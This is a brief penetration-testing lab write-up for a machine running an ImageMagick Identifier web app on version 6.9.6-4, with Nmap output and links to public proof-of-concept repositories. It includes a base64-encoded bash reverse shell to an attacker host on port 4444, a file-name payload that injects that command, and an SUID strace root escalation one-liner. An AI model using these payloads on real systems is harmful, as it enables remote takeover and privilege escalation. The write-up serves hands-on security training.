____

> [!info]
> IP= 192.168.190.178

# Nmap
|PORT|STATE|SERVICE|
|---|---|---|
|22/tcp|open|ssh|
|80/tcp|open|http|

```python
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
```
# 80 - http
- ImageMagick Identifier
- Version: 6.9.6-4

![Captura](../../../../assets/images/reference/955a2d6d752c0e8bca6e.png)

https://github.com/Sybil-Scan/imagemagick-lfi-poc

https://github.com/voidz0r/CVE-2022-44268

https://github.com/ImageMagick/ImageMagick/issues/6339

```bash
echo "bash -i >& /dev/tcp/192.168.45.180/4444 0>&1 | sh" | base64 -w 0
```

```bash
|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4MC80NDQ0IDA+JjEgfCBzaAo= | base64 -d | bash`".png
```

# PrivEsc

## suid strace

```bash
strace -o /dev/null /bin/sh -p
```
